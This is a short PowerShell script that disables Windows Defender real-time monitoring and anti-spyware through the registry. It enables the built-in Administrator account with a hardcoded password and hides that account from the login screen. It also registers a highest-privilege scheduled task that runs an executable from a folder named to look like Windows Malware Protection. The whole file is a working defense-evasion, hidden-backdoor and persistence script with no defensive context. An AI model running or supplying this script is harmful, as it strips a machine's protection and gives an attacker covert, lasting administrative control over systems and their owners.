#Wreck Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$Name = "DisableAntiSpyware"
$value = "1"
New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null

#Activate Admin and set password
net user Administrator /active:yes
net user Administrator Password01

#Add Keys
New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"
New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

#Hide Administrator
$registryPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$Name = "Administrator"
$value = "0"
New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null

#Create startup Task
$Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
$Password = "Password01"
$triggers = @()
$triggers += New-JobTrigger -AtStartup
$triggers += New-JobTrigger -Once -At (Get-Date).AddMinutes(1)
$setting = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
Register-ScheduledTask -Action $action -Settings $setting -Trigger $triggers -RunLevel Highest -User $Username -Password $Password -TaskName "Windows Malware Protection"